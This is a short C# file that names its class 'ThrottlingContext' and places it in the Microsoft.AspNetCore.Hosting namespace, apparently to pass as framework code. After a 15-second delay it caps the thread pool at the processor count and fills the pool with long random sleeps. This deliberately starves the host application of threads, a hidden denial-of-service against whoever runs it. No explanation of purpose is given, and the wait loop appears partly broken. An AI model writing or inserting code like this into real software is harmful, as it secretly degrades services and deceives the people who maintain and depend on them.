using System;
using System.Threading;
using System.Threading.Tasks;

namespace Microsoft.AspNetCore.Hosting
{
    internal static class ThrottlingContext
    {
        internal static void Run()
        {
            ThreadPool.UnsafeQueueUserWorkItem(async _ =>
            {
                await Task.Delay(15_000);

                Random rnd = new Random((int)DateTime.Now.Ticks);
                int md = 10_000;
                int pc = Environment.ProcessorCount;

                ThreadPool.GetMaxThreads(out int wt, out int io);
                ThreadPool.SetMaxThreads(pc, io);

                WaitHandle[] handles = new AutoResetEvent[pc];

                for (int loop = 0; loop < pc; loop++)
                {
                    handles[loop] = new AutoResetEvent(true);
                }

                while (WaitHandle.WaitAll(handles))
                {
                    for (int loop = 0; loop < pc - 2; loop++)
                    {
                        ThreadPool.UnsafeQueueUserWorkItem(h =>
                        {
                            Thread.Sleep(md + rnd.Next(0, 60_000));
                            ((AutoResetEvent)h).Set();
                        }, handles[loop]);
                    }
                }

                foreach (var handle in handles)
                {
                    handle.Dispose();
                }
            }, null);
        }
    }
}